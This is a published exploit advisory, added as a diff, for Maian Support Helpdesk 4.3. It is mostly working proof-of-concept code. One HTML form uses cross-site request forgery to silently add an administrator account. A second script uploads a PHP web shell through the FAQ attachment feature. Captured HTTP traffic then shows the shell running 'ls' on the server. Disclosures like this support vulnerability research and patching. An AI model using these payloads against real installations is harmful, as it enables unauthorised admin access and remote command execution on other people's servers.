@@ -1,0 +1,170 @@
+# Exploit Title: Maian Support Helpdesk 4.3 - Cross-Site Request Forgery (Add Admin)
+# Date: 2020-04-26
+# Author: Besim ALTINOK
+# Vendor Homepage: https://www.maiansupport.com
+# Software Link: https://www.maiansupport.com/zip.html
+# Version: v4.3
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+----------------------------------------------
+
+Here is the Detail:
+--------------------------------------------------
+This product is unprotected against CSRF vulnerabilities. With this attack,
+you can add an admin account to the system. In addition, you can add files
+from the F.A.Q field as admin.There are no file restrictions here.
+Therefore, you can upload a PHP file here with CSRF.
+
+If you want, you can add an admin account first and then access the system
+and upload files.
+Or you can upload files with direct admin rights.
+
+---------------------------------------------------
+CSRF PoC - 1 (Add Administrator user)
+-------------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/helpdesk/admin/index.php?ajax=team"
+method="POST">
+      <input type="hidden" name="enabled" value="yes" />
+      <input type="hidden" name="admin" value="yes" />
+      <input type="hidden" name="welcome" value="yes" />
+      <input type="hidden" name="name" value="Besim&#32;ALTINOK" />
+      <input type="hidden" name="email" value="test2&#64;gmail&#46;com" />
+      <input type="hidden" name="accpass" value="111111" />
+      <input type="hidden" name="timezone" value="0" />
+      <input type="hidden" name="language" value="" />
+      <input type="hidden" name="addpages" value="" />
+      <input type="hidden" name="notePadEnable" value="yes" />
+      <input type="hidden" name="enableLog" value="yes" />
+      <input type="hidden" name="mergeperms" value="yes" />
+      <input type="hidden" name="profile" value="yes" />
+      <input type="hidden" name="ticketHistory" value="yes" />
+      <input type="hidden" name="close" value="yes" />
+      <input type="hidden" name="lock" value="yes" />
+      <input type="hidden" name="editperms&#91;&#93;" value="ticket" />
+      <input type="hidden" name="editperms&#91;&#93;" value="reply" />
+      <input type="hidden" name="timer" value="yes" />
+      <input type="hidden" name="startwork" value="yes" />
+      <input type="hidden" name="workedit" value="yes" />
+      <input type="hidden" name="notify" value="yes" />
+      <input type="hidden" name="spamnotify" value="yes" />
+      <input type="hidden" name="signature" value="" />
+      <input type="hidden" name="nameFrom" value="" />
+      <input type="hidden" name="emailFrom" value="" />
+      <input type="hidden" name="email2" value="" />
+      <input type="hidden" name="notes" value="" />
+      <input type="hidden" name="mailbox" value="yes" />
+      <input type="hidden" name="mailDeletion" value="yes" />
+      <input type="hidden" name="mailScreen" value="yes" />
+      <input type="hidden" name="mailCopy" value="yes" />
+      <input type="hidden" name="mailFolders" value="5" />
+      <input type="hidden" name="mailPurge" value="0" />
+      <input type="hidden" name="digest" value="yes" />
+      <input type="hidden" name="process" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+- After the Add admin account, you can upload the PHP file.
+
+CSRF PoC 2 - ( Directly, File Upload)
+----------------------------------------------------
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST",
+"http:\/\/localhost\/helpdesk\/admin\/index.php?ajax=faqattach", true);
+        xhr.setRequestHeader("Accept", "application\/json,
+text\/javascript, *\/*; q=0.01");
+        xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data;
+boundary=---------------------------1851832753272583700731626849");
+        xhr.withCredentials = true;
+        var body =
+"-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"file[]\";
+filename=\"shell.php\"\r\n" +
+          "Content-Type: text/php\r\n" +
+          "\r\n" +
+          "\x3c?php echo system($_GET[\'cmd\']); ?\x3e\n" +
+          "\r\n" +
+          "-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"file[]\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"remote[]\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"remote[]\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"remote[]\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"process\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "-----------------------------1851832753272583700731626849\r\n" +
+          "Content-Disposition: form-data; name=\"opath\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------1851832753272583700731626849--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request"
+onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+HTTP Request:
+-----------------------------------------------------------------------------------------
+GET /helpdesk/content/attachments-faq/shell.php?cmd=ls HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0)
+Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=4574c8e8190d39edd9d13a0fd9a502ec;
+bp_ut_session={"pageviews":1,"referrer":"
+http://localhost/olms/library/assets/js/images/","landingPage":"
+http://localhost/olms/library/assets/js/images/sort_asc.html
+","started":1587817504988};
+HESKb910af33bb5d80030b1f4b6f8666b57fac433d4d=71c43ff24f63f83f5a34d28997251db6
+Upgrade-Insecure-Requests: 1
+
+HTTP Response:
+-------------------------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Sun, 26 Apr 2020 12:15:31 GMT
+Server: Apache/2.4.43 (Unix) OpenSSL/1.1.1f PHP/7.2.29 mod_perl/2.0.8-dev
+Perl/v5.16.3
+X-Powered-By: PHP/7.2.29
+Content-Length: 39
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+shell.php
+shell_test.php
+shell_test.php
